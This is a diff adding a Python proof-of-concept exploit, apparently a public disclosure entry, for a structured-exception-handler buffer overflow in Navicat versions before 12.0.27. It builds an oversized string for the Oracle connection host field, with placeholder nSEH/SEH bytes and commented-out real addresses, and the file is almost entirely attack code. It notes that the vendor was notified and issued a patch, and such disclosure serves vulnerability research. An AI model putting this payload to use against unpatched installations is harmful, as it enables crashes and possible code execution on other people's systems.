@@ -1,0 +1,24 @@
+#!/usr/bin/python
+# Title: Navicat < 12.0.27 Oracle Connection Overflow
+# Author: Kevin McGuigan
+# Twitter: @_h3xagram
+# Author Website: https://www.7elements.co.uk
+# Vendor Website: https://www.navicat.com
+# Date: 27/04/2018
+# Version: 12.0.26
+# Tested on Windows 7 32-bit
+# Vendor notified on 04/04/2018. Patch issued on 25/04/2018.
+
+
+# Generate file > Create new Oracle Connection > paste contents of "navicatPOC.txt" into host field and test connection to trigger overflow. 
+filename="navicatPOC.txt"
+junk = "A" * 1502
+#nseh = "\x4C\x4C\x77\x04"
+#seh= "\x75\x2a\x01\x10"
+nseh = "B" * 4
+seh = "C" * 4
+fill = "D" * 4000
+buffer = junk + nseh + seh + fill
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
